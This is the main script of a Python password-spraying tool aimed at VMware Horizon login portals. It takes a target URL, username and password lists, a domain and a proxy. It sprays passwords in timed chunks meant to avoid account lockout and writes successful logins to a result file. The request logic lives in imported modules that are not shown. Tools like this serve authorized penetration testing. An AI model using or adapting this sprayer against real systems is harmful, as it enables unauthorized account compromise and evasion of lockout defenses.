import argparse
import logging
import sys
import time
from pathlib import Path

from brutemethehorizon import helper, sprayer
from brutemethehorizon.config import Colors, Config

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="VMWare Horizon Password Sprayer")
    parser.add_argument("-u", "--url", type=str,
                        help="Horizon URL", required=True)

    parser.add_argument("--username", type=str, help="Username")
    parser.add_argument("--userfile", type=str, help="List of Usernames")

    parser.add_argument("--password", type=str, help="Password")
    parser.add_argument("--passfile", type=str, help="List of Passwords")

    parser.add_argument("--domain", required=False, type=str, help="Specify NetBIOS domain name")

    parser.add_argument("-l", "--lock_time", type=int, default=15,
                        help="Time in minutes between sprays. Default: 15 minutes")
    parser.add_argument("-c", "--count", type=int, default=1,
                        help="Password per spray. Default: 1")

    parser.add_argument("--proxy", type=str,
                        help="HTTP(S) Proxy. Format: [http(s)://ip:port]")
    parser.add_argument("--output-prefix", type=str,
                        help="Output prefix ({prefix}_result.txt Default: horizon", default="horizon")
    parser.add_argument("--debug", action="store_true", help="Debug output")
    parser.add_argument("--output-dir", default="./", help="Output directory. Default: ./")
    args = parser.parse_args()

    # Args checks
    if (not args.username) == (not args.userfile):
        parser.print_help()
        print("You must define username or userlist to brute", file=sys.stderr)
        sys.exit(2)

    if (not args.password) == (not args.passfile):
        parser.print_help()
        print("You must define password or passfile to brute", file=sys.stderr)
        sys.exit(2)

    if args.userfile and not Path(args.userfile).is_file():
        parser.print_help()
        print(f"Userfile {args.userfile} doesn't exist", file=sys.stderr)
        sys.exit(2)

    if args.passfile and not Path(args.passfile).is_file():
        parser.print_help()
        print(f"Passfile {args.passfile} doesn't exist", file=sys.stderr)
        sys.exit(2)

    if not Path(args.output_dir).is_dir():
        parser.print_help()
        print(f"Directory {args.output_dir} doesn't exist", file=sys.stderr)
        sys.exit(2)

    # Prepare
    args.url = helper.prepare_url(args.url)
    logger = logging.getLogger('horizon')
    if args.debug:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    ch = logging.StreamHandler(sys.stdout)
    formatter = logging.Formatter(
        "[%(asctime)s]-[%(levelname)s] %(message)s \n")
    ch.setFormatter(formatter)
    logger.addHandler(ch)

    kerberos, domain = helper.check(args.url)
    logger.info(f"URL: {args.url}")
    print(f"[{Colors.green}+{Colors.reset}] {kerberos}")
    print(f"[{Colors.green}+{Colors.reset}] {domain}")

    if not args.domain:
        args.domain = domain

    userlist = helper.get_list_from_file(
        args.userfile) if args.userfile else args.username.split(',')
    passlist = helper.get_list_from_file(
        args.passfile) if args.passfile else args.password.split(',')

    logger.debug(f"Lock time: {args.lock_time}")
    logger.debug(f"Passwords per spray: {args.count}")
    logger.debug(f"Debug: {args.debug}")

    logger.debug(f"Sleep time: {Config.sleep_time} mins.")

    result_file = Path(args.output_dir) / Path(f"{args.output_prefix}_result.txt")
    logger.info(f"Result file: {result_file}")

    logger.info(f"Userlist contains {len(userlist)} entries")
    logger.info(f"Passlist contains {len(passlist)} entries")

    for password_chunk in helper.get_chunks_from_list(passlist, args.count):
        t = time.time()
        logger.info(f"Password chunk: {password_chunk}")
        result = sprayer.run(args.url, userlist,
                             password_chunk, args.domain)
        if result is None:
            exit(1)
        helper.write_data(result, result_file)
        t = time.time() - t
        logger.info(f"Spray time: {int(t // 60)} min, {int(t % 60)} sec")
        if not helper.check_last_chunk(password_chunk, passlist):
            helper.timer(args.lock_time - int(t // 60), "[*] Next spray in:")
